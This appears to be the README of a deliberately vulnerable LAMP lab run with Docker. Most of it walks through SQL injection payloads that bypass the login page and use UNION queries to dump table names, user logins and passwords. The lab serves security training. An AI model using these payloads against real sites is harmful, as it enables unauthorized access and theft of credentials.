# Vulnerable LAMP

Exploiting a LAMP server using different techniques

## Getting started

### Prerequisites

* Docker

### Usage

After cloning the repo and cd-ing into it
```
docker-compose up -d
```

## Vulnarabilities

### SQL Injection

On the login page, type **admin' or 1=1;#** and anything as a password (but not empty)
With that we bypassed login screen.

We can get more information:
* Number of columns: **admin' or 1=1 order by 7;#** if we order by 8 we'll get an error
* Used columns: **admin' union select 1,2,3,4,5,6,7;#**
* Database's name: **admin' union select 1,2,database(),4,5,6,7;#**
* Tables' names: **admin' union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema=database();#**
* Table's columns: **admin' union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='users';#**
* Users' login: **admin' union select 1,group_concat(login),3,4,5,6,7 from users;#
* Users' password: **admin' union select 1,group_concat(mot_de_passe),3,4,5,6,7 from users;#**

